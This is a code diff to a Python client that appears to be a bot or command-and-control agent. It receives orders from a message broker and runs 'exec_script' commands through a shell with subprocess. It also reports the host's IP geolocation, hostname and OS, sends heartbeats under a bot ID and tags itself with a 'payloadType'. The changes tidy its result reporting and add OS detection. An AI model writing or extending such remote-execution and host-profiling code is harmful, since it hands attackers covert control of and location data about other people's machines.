@@ -15,7 +15,7 @@ import geocoder
 def get_current_gps_coordinates():
     g = geocoder.ip('me')
     if g.latlng is not None:
-        return g.latlng
+        return f"{g.latlng[0]},{g.latlng[1]}"
     else:
         return None
 
@@ -27,11 +27,11 @@ def handle_callback(task, group_id):
     print(f'Received order {task}')
     print(f'Received script execution order, proceeding to execute it')
     # Execute the task
+    result_str = ""
     try:
         # Execute the script
         if task['actionType'] == 'exec_script':
             # For exec_script, use subprocess.run
-            result_str = ""
             for command in task['parameters']['value'].split("\n"):
                 result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
                 print(f'Script output: {result.stdout}')
@@ -45,7 +45,7 @@ def handle_callback(task, group_id):
             print(f'Geolocation requested successfully, lat,lng: {result_str}')
     except subprocess.CalledProcessError as e:
         print(f'Script execution failed: {e.stderr}')
-        result = e.stderr
+        result_str += e.stderr
         
     # Produce a callback message
     callback_task = {
@@ -91,6 +91,18 @@ def produce_heart_beat(bootstrap_servers, topic, bot_id):
         'result': "success"
     }
     produce_message(bootstrap_servers, "heartbeat", heart_beat_task)
+    
+""" return Windows if its a windows Os, Linux if linux Os, MacOs if mac Os r other if undeterminated """
+def getCurrentOsUsed():
+    system = platform.system().lower()
+    if system == 'windows':
+        return 'Windows'
+    elif system == 'linux':
+        return 'Linux'
+    elif system == 'darwin':
+        return 'MacOS'
+    else:
+        return 'Other'
 
 def main(bootstrap_servers, topic, bot_id, storeNewBotId = False):
     # Create and start the consumer daemon
@@ -118,8 +130,9 @@ def main(bootstrap_servers, topic, bot_id, storeNewBotId = False):
         'actionType': 'init',
         'parameters': {
             'groupId': group_id,
-            'os': platform.platform(),
+            'os': getCurrentOsUsed(),
             'name': platform.node(),
+            'payloadType': "python",
             'geolocation': result_geolocation__str
         },
         'result': "success"
